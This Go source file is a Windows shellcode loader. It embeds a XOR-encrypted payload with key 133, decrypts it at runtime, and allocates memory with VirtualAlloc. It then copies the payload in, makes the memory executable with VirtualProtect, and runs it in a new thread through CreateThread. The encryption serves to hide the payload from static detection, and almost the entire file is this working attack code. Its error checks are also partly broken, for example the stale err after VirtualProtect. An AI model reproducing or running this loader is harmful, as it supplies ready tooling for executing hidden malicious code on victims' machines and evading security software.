package main

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	secretKey := byte(133)

	// Put encrypted byte from prepare here
	encryptedShellcode := []byte{121, 205, 6, 97, 117, 109, 73, 133, 133, 133, 196, 212, 196, 213, 215, 205, 180, 87, 224, 205, 14, 215, 229, 212, 205, 14, 215, 157, 205, 14, 215, 165, 211, 205, 138, 50, 207, 207, 200, 180, 76, 205, 14, 247, 213, 205, 180, 69, 41, 185, 228, 249, 135, 169, 165, 196, 68, 76, 136, 196, 132, 68, 103, 104, 215, 205, 14, 215, 165, 14, 199, 185, 196, 212, 205, 132, 85, 227, 4, 253, 157, 142, 135, 138, 0, 247, 133, 133, 133, 14, 5, 13, 133, 133, 133, 205, 0, 69, 241, 226, 205, 132, 85, 193, 14, 197, 165, 14, 205, 157, 213, 204, 132, 85, 102, 211, 200, 180, 76, 205, 122, 76, 196, 14, 177, 13, 205, 132, 83, 205, 180, 69, 41, 196, 68, 76, 136, 196, 132, 68, 189, 101, 240, 116, 201, 134, 201, 161, 141, 192, 188, 84, 240, 93, 221, 193, 14, 197, 161, 204, 132, 85, 227, 196, 14, 137, 205, 193, 14, 197, 153, 204, 132, 85, 196, 14, 129, 13, 205, 132, 85, 196, 221, 196, 221, 219, 220, 223, 196, 221, 196, 220, 196, 223, 205, 6, 105, 165, 196, 215, 122, 101, 221, 196, 220, 223, 205, 14, 151, 108, 206, 122, 122, 122, 216, 204, 59, 242, 246, 183, 218, 182, 183, 133, 133, 196, 211, 204, 12, 99, 205, 4, 105, 37, 132, 133, 133, 204, 12, 96, 204, 57, 135, 133, 148, 68, 143, 3, 92, 93, 196, 209, 204, 12, 97, 201, 12, 116, 196, 63, 201, 242, 163, 130, 122, 80, 201, 12, 111, 237, 132, 132, 133, 133, 220, 196, 63, 172, 5, 238, 133, 122, 80, 239, 143, 196, 219, 213, 213, 200, 180, 76, 200, 180, 69, 205, 122, 69, 205, 12, 71, 205, 122, 69, 205, 12, 68, 196, 63, 111, 138, 90, 101, 122, 80, 205, 12, 66, 239, 149, 196, 221, 201, 12, 103, 205, 12, 124, 196, 63, 28, 32, 241, 228, 122, 80, 0, 69, 241, 143, 204, 122, 75, 240, 96, 109, 22, 133, 133, 133, 205, 6, 105, 149, 205, 12, 103, 200, 180, 76, 239, 129, 196, 221, 205, 12, 124, 196, 63, 135, 92, 77, 218, 122, 80, 6, 125, 133, 251, 208, 205, 6, 65, 165, 219, 12, 115, 239, 197, 196, 220, 237, 133, 149, 133, 133, 196, 221, 205, 12, 119, 205, 180, 76, 196, 63, 221, 33, 214, 96, 122, 80, 205, 12, 70, 204, 12, 66, 200, 180, 76, 204, 12, 117, 205, 12, 95, 205, 12, 124, 196, 63, 135, 92, 77, 218, 122, 80, 6, 125, 133, 248, 173, 221, 196, 210, 220, 237, 133, 197, 133, 133, 196, 221, 239, 133, 223, 196, 63, 142, 170, 138, 181, 122, 80, 210, 220, 196, 63, 240, 235, 200, 228, 122, 80, 204, 122, 75, 108, 185, 122, 122, 122, 205, 132, 70, 205, 172, 67, 205, 0, 115, 240, 49, 196, 122, 98, 221, 239, 133, 220, 204, 66, 71, 117, 48, 39, 211, 122, 80}

	var clearShellcode []byte

	for i := 0; i < len(encryptedShellcode); i++ {
		clearShellcode = append(clearShellcode, encryptedShellcode[i]^secretKey)
	}

	// Allocating memory
	fmt.Println("Allocating Memory")
	pNewlyAllocatedMem, err := windows.VirtualAlloc(uintptr(0), uintptr(len(clearShellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		fmt.Println("Failed to Allocate Memory")
		fmt.Println(err.Error())
	}
	fmt.Println("Done ...")

	// Copying Shellcode
	fmt.Println("Copying Shellcode")
	destination := unsafe.Slice((*byte)(unsafe.Pointer(pNewlyAllocatedMem)), len(clearShellcode))
	copy(destination, clearShellcode)
	fmt.Println("Done ...")

	fmt.Println("Changing Protection")
	var oldprotect uint32
	windows.VirtualProtect(pNewlyAllocatedMem, uintptr(len(clearShellcode)), windows.PAGE_EXECUTE_READ, &oldprotect)
	if err != nil {
		fmt.Println("Failed to Change Protection")
		fmt.Println(err.Error())
	}
	fmt.Println("Done ...")

	// Launching Thread
	fmt.Println("Launching thread")
	KERNEL32DLL := windows.NewLazyDLL("kernel32.dll")
	procCreateThread := KERNEL32DLL.NewProc("CreateThread")
	h, _, err := procCreateThread.Call(0, 0, pNewlyAllocatedMem, 0, 0, 0)
	if err != nil {
		fmt.Println("Failed to run thread")
		fmt.Println(err.Error())
	}
	fmt.Println("Done ...")

	windows.WaitForSingleObject(windows.Handle(h), windows.INFINITE)
}